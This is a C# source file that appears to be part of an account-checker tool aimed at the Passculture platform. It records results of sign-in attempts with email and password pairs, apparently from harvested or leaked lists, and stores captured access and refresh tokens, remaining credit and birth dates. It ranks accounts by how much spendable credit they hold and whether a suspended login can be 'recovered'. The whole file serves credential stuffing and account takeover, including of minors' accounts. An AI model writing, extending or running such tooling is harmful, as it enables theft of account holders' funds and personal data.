using System.Text.Json;
using System.Text.Json.Serialization;
using DataVortex.Core.Abstractions;
using DataVortex.Core.Models;
using Microsoft.Extensions.Logging;

namespace DataVortex.Core.Accounts;

/// <summary>Normalized identity of a Passculture account. The email is case/whitespace-insensitive; the
/// password is trimmed but case-sensitive. The source URL is context, NOT identity.</summary>
public static class AccountKey
{
    public static string Of(string? email, string? password)
        => $"{(email ?? "").Trim().ToLowerInvariant()}{(password ?? "").Trim()}";
}

/// <summary>Outcome of a single backend sign-in test, persisted so a given account is sent to Passculture
/// at most once (each send costs a captcha).</summary>
public sealed record AccountTestResult(
    bool Success,
    int StatusCode,
    string? AccessToken = null,
    string? RefreshToken = null,
    decimal? Credit = null,
    string? BirthDate = null,
    string? Message = null,
    DateTime TestedUtc = default,
    string? AccountState = null);

/// <summary>A known account: its (display) identity plus the test outcome.</summary>
public sealed class AccountEntry
{
    public string Email { get; set; } = "";
    public string Password { get; set; } = "";
    public string? Url { get; set; }
    public AccountTestResult Result { get; set; } = new(false, 0);
}

public interface IAccountTestRegistry
{
    /// <summary>Atomically claims an account for testing. Returns <c>false</c> if it was already tested or is
    /// currently reserved by another worker — this is what guarantees it is never sent to the backend twice.</summary>
    bool TryReserve(string? email, string? password, string? url);

    /// <summary>Records a backend outcome and persists it; clears the reservation.</summary>
    void Complete(string? email, string? password, AccountTestResult result);

    /// <summary>Releases a reservation without recording a result (e.g. no backend response), so the
    /// account may be retried later.</summary>
    void Release(string? email, string? password);

    /// <summary>Returns the stored outcome if the account has already been tested.</summary>
    bool TryGet(string? email, string? password, out AccountTestResult result);

    /// <summary>Forgets every tested account (memory + storage) so they can all be re-tested from scratch.</summary>
    void Reset();

    int Count { get; }
}

/// <summary>
/// Single source of truth for "has this account already been sent to Passculture?". Persisted to
/// <c>data/account-tests.json</c>. Thread-safe; every test path reserves atomically before calling the
/// backend so the same account can never spend two captchas. On first run it migrates already-tested
/// credentials out of the existing metadata so history is not re-tested.
/// </summary>
public sealed class AccountTestRegistry : IAccountTestRegistry
{
    private static readonly JsonSerializerOptions Json = new()
    {
        WriteIndented = true,
        Converters = { new JsonStringEnumConverter() }
    };

    private readonly string _path;
    private readonly IStorageService _storage;
    private readonly ILogger<AccountTestRegistry> _log;
    private readonly object _gate = new();
    private readonly Dictionary<string, AccountEntry> _tested = new();
    private readonly HashSet<string> _reserved = new();

    public AccountTestRegistry(AppPaths paths, IStorageService storage, ILogger<AccountTestRegistry> log)
    {
        _path = Path.Combine(paths.Root, "account-tests.json");
        _storage = storage;
        _log = log;
        Load();
    }

    public int Count { get { lock (_gate) return _tested.Count; } }

    public bool TryReserve(string? email, string? password, string? url)
    {
        var key = AccountKey.Of(email, password);
        lock (_gate)
        {
            if (_tested.ContainsKey(key) || _reserved.Contains(key)) return false;
            _reserved.Add(key);
            return true;
        }
    }

    public void Complete(string? email, string? password, AccountTestResult result)
    {
        var key = AccountKey.Of(email, password);
        AccountEntry entry;
        lock (_gate)
        {
            _reserved.Remove(key);
            entry = new AccountEntry
            {
                Email = (email ?? "").Trim(),
                Password = (password ?? "").Trim(),
                Result = result.TestedUtc == default ? result with { TestedUtc = DateTime.UtcNow } : result
            };
            _tested[key] = entry;
        }
        // Single-row upsert, OUTSIDE the lock: O(1) per test and no worker is blocked on a growing file write.
        _storage.UpsertAccount(ToRecord(key, entry));
    }

    public void Release(string? email, string? password)
    {
        var key = AccountKey.Of(email, password);
        lock (_gate) _reserved.Remove(key);
    }

    public bool TryGet(string? email, string? password, out AccountTestResult result)
    {
        var key = AccountKey.Of(email, password);
        lock (_gate)
        {
            if (_tested.TryGetValue(key, out var e)) { result = e.Result; return true; }
            result = new AccountTestResult(false, 0);
            return false;
        }
    }

    public void Reset()
    {
        lock (_gate) { _tested.Clear(); _reserved.Clear(); }
        _storage.ClearAccounts();
        _log.LogInformation("Account registry reset — every account will be re-tested from scratch");
    }

    private void Load()
    {
        // Seed the in-memory dedup index from the SQLite store (one query, no whole-file read).
        var stored = _storage.LoadAccounts();
        if (stored.Count > 0)
        {
            foreach (var a in stored) _tested[a.Key] = ToEntry(a);
            // Re-derive the stored Category column under the latest rules (e.g. RECUP/INACTIVE/ANONYM added later),
            // so existing rows reclassify on the spot — no backend call, no captcha.
            try
            {
                var changed = _storage.RecategorizeAccounts(Categorize);
                if (changed > 0) _log.LogInformation("Account registry recategorized {Count} row(s) under the latest rules", changed);
            }
            catch (Exception ex) { _log.LogWarning(ex, "Account recategorization failed"); }
            _log.LogInformation("Account registry loaded: {Count} known account(s)", _tested.Count);
            return;
        }

        // Empty table → one-time migration of the legacy account-tests.json, if present.
        try
        {
            if (File.Exists(_path))
            {
                var entries = JsonSerializer.Deserialize<List<AccountEntry>>(File.ReadAllText(_path), Json);
                if (entries is not null)
                {
                    foreach (var e in entries)
                    {
                        var key = AccountKey.Of(e.Email, e.Password);
                        _tested[key] = e;
                        _storage.UpsertAccount(ToRecord(key, e));
                    }
                    try { File.Move(_path, _path + ".migrated", overwrite: true); } catch { }
                    _log.LogInformation("Account registry migrated {Count} account(s) from account-tests.json", _tested.Count);
                    return;
                }
            }
        }
        catch (Exception ex) { _log.LogWarning(ex, "Failed to migrate account-tests.json; will try metadata"); }

        // Otherwise: import already-tested credentials from existing metadata so we never re-test history.
        try
        {
            foreach (var r in _storage.LoadRecords())
            {
                if (r.Credentials is null) continue;
                foreach (var c in r.Credentials)
                {
                    if (!c.Tested) continue;
                    var key = AccountKey.Of(c.Username, c.Password);
                    if (_tested.ContainsKey(key)) continue;
                    var entry = new AccountEntry
                    {
                        Email = (c.Username ?? "").Trim(),
                        Password = (c.Password ?? "").Trim(),
                        Url = c.Url,
                        Result = new AccountTestResult(
                            c.TestSuccess ?? false, c.StatusCode ?? 0, c.AccessToken, c.RefreshToken,
                            c.Credit, c.BirthDate, c.TestMessage, c.TestedUtc ?? DateTime.UtcNow, c.AccountState)
                    };
                    _tested[key] = entry;
                    _storage.UpsertAccount(ToRecord(key, entry));
                }
            }
            if (_tested.Count > 0)
                _log.LogInformation("Account registry migrated {Count} tested account(s) from metadata", _tested.Count);
        }
        catch (Exception ex) { _log.LogWarning(ex, "Account registry migration failed"); }
    }

    private static AccountRecord ToRecord(string key, AccountEntry e)
    {
        var r = e.Result;
        return new AccountRecord(
            key, e.Email, e.Password, e.Url,
            r.Success, r.StatusCode, r.AccountState, Categorize(r.StatusCode, r.AccountState, r.Credit, r.BirthDate),
            r.Credit, r.BirthDate, r.Message, r.TestedUtc == default ? DateTime.UtcNow : r.TestedUtc,
            r.AccessToken, r.RefreshToken);
    }

    private static AccountEntry ToEntry(AccountRecord a) => new()
    {
        Email = a.Email,
        Password = a.Password,
        Url = a.Url,
        Result = new AccountTestResult(a.Success, a.StatusCode, a.AccessToken, a.RefreshToken,
            a.Credit, a.BirthDate, a.Message, a.TestedUtc, a.AccountState)
    };

    /// <summary>Mirror of <c>CredentialEntry.Category</c> (keep both in sync), computed at write time so the UI
    /// can filter in SQL. A user-reversible suspension is RECUP; a hard suspended/suspicious/deleted/anonymized
    /// state is BAN; a generic inactive account is INACTIVE; an ACTIVE adult spent to 0 credit is EXPIRE (a minor
    /// spent to 0 stays VALIDE — the grant can still grow when they turn 18).</summary>
    public static string Categorize(int statusCode, string? accountState, decimal? creditRemaining = null, string? birthDate = null) => statusCode switch
    {
        // A user-reversible suspension (UPON_USER_REQUEST / SUSPICIOUS_LOGIN_REPORTED_BY_USER) is NOT a hard ban:
        // we hold the login, so it can be reactivated → its own RECUP bucket. Checked first because those strings
        // also contain SUSPEND/SUSPICIOUS, which IsBadState matches.
        200 when IsRecoverableState(accountState) => "RECUP",
        200 when IsBadState(accountState) => "BAN",
        // Expired opportunity (ex_beneficiary / aged-out): the credit is no longer usable → EXPIRE, even if a stale
        // remaining shows > 0. Checked before the credit rule below.
        200 when IsExpiredState(accountState) => "EXPIRE",
        // Usable credit (and not banned/recoverable/expired) = VALIDE, WHATEVER the statusType — e.g. an "eligible"
        // underage beneficiary that still has money to spend (GRANT_17_18 with remaining > 0).
        200 when creditRemaining > 0m => "VALIDE",
        // ACTIVE spent to 0 AND aged 18+ has no more credit coming → EXPIRE. A minor spent to 0 stays VALIDE (the
        // GRANT can still grow at 18). Only an explicit 0 demotes; null credit / unknown age → VALIDE.
        200 when string.Equals(accountState, "ACTIVE", StringComparison.OrdinalIgnoreCase) && creditRemaining == 0m && IsAdult(birthDate) => "EXPIRE",
        200 when string.Equals(accountState, "ACTIVE", StringComparison.OrdinalIgnoreCase) => "VALIDE",
        200 when string.Equals(accountState, "INACTIVE", StringComparison.OrdinalIgnoreCase) => "INACTIVE",
        200 => "CUSTOM", // incl. still-eligible non_eligible / eligible without credit
        // A 400 carrying a reason code: a "bad" code (e.g. ACCOUNT_DELETED / ACCOUNT_ANONYMIZED) is BAN; any other
        // recognised code (e.g. EMAIL_NOT_VALIDATED) is CUSTOM; a bare 400 is a wrong password → INVALIDE.
        400 when IsRecoverableState(accountState) => "RECUP",
        400 when IsBadState(accountState) => "BAN",
        400 when !string.IsNullOrEmpty(accountState) => "CUSTOM",
        400 => "INVALIDE",
        _ => ""
    };

    /// <summary>Account states that mean the account is permanently unusable: hard-suspended (fraud/admin),
    /// suspicious, deleted, or (waiting-for-)anonymized. Reversible user suspensions are excluded — see
    /// <see cref="IsRecoverableState"/> (checked before this in <see cref="Categorize"/>).</summary>
    public static bool IsBadState(string? state) =>
        state is not null && (
            state.Contains("SUSPEND", StringComparison.OrdinalIgnoreCase) ||
            state.Contains("SUSPICIOUS", StringComparison.OrdinalIgnoreCase) ||
            state.Contains("DELET", StringComparison.OrdinalIgnoreCase) ||
            state.Contains("ANONYM", StringComparison.OrdinalIgnoreCase));

    /// <summary>User-reversible suspensions: the account can still sign in (allow_inactive) and be reactivated —
    /// UPON_USER_REQUEST via <c>POST /account/unsuspend</c>, a suspicious-login report via the emailed link. Kept
    /// distinct from a hard fraud/admin/deleted ban → RECUP, not BAN.</summary>
    public static bool IsRecoverableState(string? state) =>
        state is not null && (
            state.Contains("UPON_USER_REQUEST", StringComparison.OrdinalIgnoreCase) ||
            state.Contains("SUSPICIOUS_LOGIN_REPORTED_BY_USER", StringComparison.OrdinalIgnoreCase));

    /// <summary>Expired-opportunity states → EXPIRE: a real <c>ex_beneficiary</c> (had a deposit, now lapsed) and
    /// the synthetic <c>eligibility_expired</c> marker (a <c>non_eligible</c> whose eligibility window has closed —
    /// see <see cref="AccountTester.RefineState"/>).</summary>
    public static bool IsExpiredState(string? state) =>
        string.Equals(state, "ex_beneficiary", StringComparison.OrdinalIgnoreCase) ||
        string.Equals(state, "eligibility_expired", StringComparison.OrdinalIgnoreCase);

    /// <summary>True only when <paramref name="birthDate"/> ("yyyy-MM-dd") is known AND the person is 18+. An
    /// unknown/unparseable date returns false, so a spent account is never demoted to EXPIRE on a guess.</summary>
    public static bool IsAdult(string? birthDate)
    {
        if (!DateTime.TryParse(birthDate, out var dob)) return false;
        var today = DateTime.UtcNow.Date;
        var age = today.Year - dob.Year;
        if (dob.Date > today.AddYears(-age)) age--;
        return age >= 18;
    }
}
